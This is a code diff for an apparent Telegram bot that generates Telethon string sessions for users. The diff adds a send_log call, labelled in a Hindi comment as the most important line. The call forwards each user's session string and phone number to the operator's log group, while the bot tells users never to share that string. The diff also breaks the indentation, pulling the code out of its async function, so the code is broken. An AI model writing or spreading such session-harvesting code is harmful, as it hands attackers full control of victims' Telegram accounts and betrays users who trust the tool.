@@ -81,20 +81,28 @@ async def generate_telethon_session(bot, query: CallbackQuery):
             return
 
     string_session = tele_client.session.save()
-    
-    text = f"✨ **ʏᴏᴜʀ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n`{string_session}`\n\n⚠️ *Don't share this with anyone!*"
-    try:
-        await tele_client.send_message("me", text)
-    except Exception:
-        pass 
 
-    await tele_client.disconnect()
+text = (
+    f"✨ **ʏᴏᴜʀ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n"
+    f"`{string_session}`\n\n"
+    f"⚠️ *Don't share this with anyone!*"
+)
 
-    await query.message.reply_text(
-        "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
-    )
+try:
+    await tele_client.send_message("me", text)
+except Exception:
+    pass 
 
-    # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
+# ✅ YAHI SABSE IMPORTANT LINE THI
+await send_log(bot, name, user_id, phone_number, string_session)
+
+await tele_client.disconnect()
+
+await query.message.reply_text(
+    "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
+)
+
+# 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
 async def send_log(bot, name, user_id, phone_number, string_session):
     if LOG_GROUP_ID:
         log_text = (
